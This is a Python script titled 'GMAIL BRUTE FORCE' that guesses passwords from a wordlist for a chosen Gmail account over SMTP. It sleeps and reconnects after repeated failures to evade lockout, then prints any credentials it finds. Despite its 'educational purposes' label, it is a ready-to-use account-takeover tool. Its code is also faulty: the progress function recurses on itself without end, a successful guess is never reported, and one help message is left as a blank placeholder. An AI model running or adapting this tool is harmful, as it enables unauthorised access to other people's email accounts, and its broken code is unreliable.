#!/usr/bin/python3
import argparse, smtplib, os, time, sys, random, datetime

MAX_ATTEMPTS = 10

def show_progress(current, total, postfix=""):
    bar_size = 100
    filled_size = int(round(bar_size * current / float(total)))
    percentage = round(100.0 * current/float(total), 1)
    bar = ("=" * filled_size ) + ("-" * (bar_size - filled_size))
    sys.stdout.write("[%s] %s%s ...%s\r" %(bar, percentage, "%", postfix))
    sys.stdout.flush()
    for i in range(11):
        time.sleep(random.random())
        show_progress(i,10)

def verify_credentials(server, email, password):
    try:
        server.login(email, password)
        return True 
    except smtplib.SMTPAuthenticationError:
        return False 
    except Exception as ex:
        print(f"Error: {str(ex)}")
        exit()

def brute_force(email, password_set, duration):
    mail_server = create_smtp_server()
    correct_password = None
    password_set_index = 0 
    count = 0
    print("1") 
    for password in password_set:
        auth_check = verify_credentials(mail_server, email, password)
        if auth_check == True: 
            correct_password = password 
            return 
        elif (count < MAX_ATTEMPTS): 
            count += 1
            show_progress(password_set_index, len(password_set))
        else: 
            print(f"Sleeping for {duration} seconds.")
            time.sleep(int(duration))
            mail_server.close()
            mail_server = create_smtp_server()
            count = 0

    if correct_password is None:
        mail_server.close()
        print("No password was found. Use a different password list.")
        print("Ensure your new password list excludes passwords you have already tried.")
        print("You can do this by: $ file1 file 2 ____________________")                                
        print("bye!")
        exit() 
    else: 
        mail_server.close()
        print(f"Credentials\nTarget email: {email}\nPassword: {correct_password}")
        current_time = datetime.datetime.now()
        print("Current time: " + current_time.strftime("%d-%m-%Y %H:%M:%S"))

def create_smtp_server():
    mail_server = smtplib.SMTP("smtp.gmail.com", 587)
    mail_server.ehlo()
    mail_server.starttls()
    return mail_server

def parse_cmd(): 
    arg_parser = argparse.ArgumentParser(prog="gmail-brute-force.py", 
            description="Brute-force GMail accounts",
            epilog="Made for educational purposes. Creator: Olivia Gallucci")
    arg_parser.add_argument("email", type=str, help="email you want to attack")
    arg_parser.add_argument("password_set", type=str, help="[/path/password_list.txt] Each password should be on a new line")
    arg_parser.add_argument("duration", type=int, help="amount of seconds you want to wait between 8 failed attacks")
    arguments = arg_parser.parse_args()
    return arguments

def display_product():
    os.system("cls" if os.name == "nt" else "clear")
    print("*****                   *****\n" +
          "***** GMAIL BRUTE FORCE *****\n" + 
          "*****                   *****\n")

def execute():
    arguments = parse_cmd()
    email = arguments.email 
    duration = arguments.duration

    display_product()
    
    with open(arguments.password_set) as file:
        pass_set = file.readlines()
        
    password_set = [x.strip() for x in pass_set]
    file.close()
    
    brute_force(email, password_set, duration)

    print("bye.")
    print("END")

if __name__ == "__main__":
    execute()